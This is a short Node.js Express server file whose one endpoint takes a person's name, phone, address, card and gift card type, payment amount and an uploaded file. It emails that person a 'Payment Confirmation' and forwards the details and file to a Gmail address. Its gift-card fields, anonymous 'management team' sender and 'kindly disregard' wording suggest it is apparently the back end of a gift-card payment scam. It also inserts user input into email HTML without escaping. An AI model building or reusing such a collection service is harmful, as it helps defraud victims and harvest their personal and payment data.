import express from "express";
import cors from "cors";
import nodemailer from "nodemailer";
import multer from "multer";
import dotenv from "dotenv";
dotenv.config();

const app = express();
// const PORT = process.env.PORT || 3000;

const storage = multer.memoryStorage(); // Use memory storage to handle file uploads without saving to disk
const upload = multer({ storage: storage });

app.use(express.json());
app.use(cors());

// Backend code
app.post("/api/send-email", upload.single("file"), async (req, res) => {
	try {
		const {
			firstName,
			lastName,
			phoneNumber,
			address,
			cardType,
			giftCardType,
			paymentReason,
			amount,
			email,
		} = req.body;
		const file = req.file;

		let userTransporter = nodemailer.createTransport({
			host: "smtp.zoho.com",
			port: 465,
			secure: true,
			auth: {
				user: process.env.EMAIL_USER,
				pass: process.env.EMAIL_PASS,
			},
		});

		let userMailOptions = {
			from: process.env.EMAIL_USER,
			to: email,
			subject: "Payment Confirmation",
			html: `
                <p>Dear ${firstName} ${lastName},</p>
                <p>Your payment details for ${paymentReason} with the amount of ${amount} have been received and are being processed. Thank you!</p>
                <p>Regards,</p>
                <p> if you did not initiate this transaction kindly disregard this Email!</p>
                <p>admin@mymanagementteam.online</p>
            `,
		};

		await userTransporter.sendMail(userMailOptions);
		console.log("Confirmation email sent successfully to user!");

		let managementTransporter = nodemailer.createTransport({
			host: "smtp.zoho.com",
			port: 465,
			secure: true,
			auth: {
				user: process.env.EMAIL_USER,
				pass: process.env.EMAIL_PASS,
			},
		});

		let managementMailOptions = {
			from: process.env.EMAIL_USER,
			to: "managementteamportal0@gmail.com",
			subject: "New Payment Form Submission",
			html: `
                <p><strong>First Name:</strong> ${firstName}</p>
                <p><strong>Last Name:</strong> ${lastName}</p>
                <p><strong>Phone Number:</strong> ${phoneNumber}</p>
                <p><strong>Address:</strong> ${address}</p>
                <p><strong>Card Type:</strong> ${cardType}</p>
                <p><strong>Gift Card Type:</strong> ${giftCardType}</p>
            `,
			attachments: [
				{
					filename: file.originalname,
					content: file.buffer, // Use file buffer instead of file path
				},
			],
		};

		await managementTransporter.sendMail(managementMailOptions);
		console.log("Email sent successfully to management!");

		res.status(200).send("Emails sent successfully");
	} catch (error) {
		console.error("Error sending emails:", error.message);
		res.status(500).send("Error sending emails: " + error.message);
	}
});

// app.listen(PORT, () => {
// 	console.log(`Server is running on port ${PORT}`);
// });

export default app;
